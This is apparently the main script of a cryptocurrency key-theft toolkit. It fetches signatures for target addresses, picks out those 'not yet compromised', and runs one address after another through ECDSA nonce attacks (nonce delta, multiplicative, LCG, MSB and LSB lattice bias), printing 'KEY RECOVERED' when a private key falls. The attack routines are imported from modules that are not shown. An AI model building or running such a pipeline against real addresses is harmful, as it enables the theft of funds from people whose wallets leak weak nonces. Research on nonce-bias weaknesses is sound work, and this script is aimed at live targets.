import sys
import time
import json
from db_manager import init_db, upsert_address, find_all_addresses, get_connection
from fetch_sigs_for_targets import fetch_and_save
from check_db_vulnerabilities import run_all_checks
from lattice_nonce_analyzer import run_lattice_recovery, get_signatures
from advanced_nonce_attacks import try_nonce_lcg, try_nonce_delta, try_nonce_multiplicative, try_msb_lattice, try_lsb_lattice

def master_scan():
    init_db()
    
    print("Step 1: Fetching signatures for targets...")
    fetch_and_save()
    
    print("\nStep 2: Running vulnerability checks...")
    run_all_checks()
    
    print("\nStep 3: Running advanced nonce analysis on targets...")
    conn = get_connection()
    cursor = conn.cursor()
    # Get addresses with signatures but not yet compromised
    cursor.execute("SELECT address FROM addresses WHERE analyzed = 1 AND (vulnerability IS NULL OR vulnerability = 'None Identified' OR vulnerability = '')")
    targets = [row[0] for row in cursor.fetchall()]
    conn.close()
    
    print(f"Found {len(targets)} potential targets for advanced analysis.")
    for addr in targets:
        print(f"\n--- Analyzing {addr} ---")
        sigs = get_signatures(addr)
        if len(sigs) < 2:
            print(f"Not enough signatures for {addr} (need at least 2, have {len(sigs)})")
            continue
            
        # 1. Try Nonce Delta (very fast)
        if try_nonce_delta(sigs, addr):
            print(f"!!! KEY RECOVERED via Nonce Delta for {addr} !!!")
            continue
            
        # 2. Try Multiplicative (fast)
        if try_nonce_multiplicative(sigs, addr):
            print(f"!!! KEY RECOVERED via Multiplicative for {addr} !!!")
            continue
            
        # 3. Try LCG (needs 4+ sigs)
        if len(sigs) >= 4:
            if try_nonce_lcg(sigs, addr):
                print(f"!!! KEY RECOVERED via LCG for {addr} !!!")
                continue
        
        # 4. Try MSB Bias (Lattice HNP)
        if try_msb_lattice(sigs, addr):
            print(f"!!! KEY RECOVERED via MSB Lattice for {addr} !!!")
            continue
            
        # 5. Try LSB Bias (Lattice HNP)
        # Fetch known bias from DB if available
        conn2 = get_connection()
        cursor2 = conn2.cursor()
        cursor2.execute("SELECT details FROM vulnerabilities WHERE address = ? AND type = 'LSB Bias' ORDER BY id DESC LIMIT 1", (addr,))
        bias_row = cursor2.fetchone()
        conn2.close()
        bias_val = 0
        if bias_row:
            try:
                details = json.loads(bias_row[0]) if isinstance(bias_row[0], str) else bias_row[0]
                bias_val = details.get('val', 0)
            except: pass
        
        if try_lsb_lattice(sigs, addr, bias_val=bias_val):
            print(f"!!! KEY RECOVERED via LSB Lattice for {addr} !!!")
            continue
    
    print("\nScan complete.")

if __name__ == "__main__":
    master_scan()
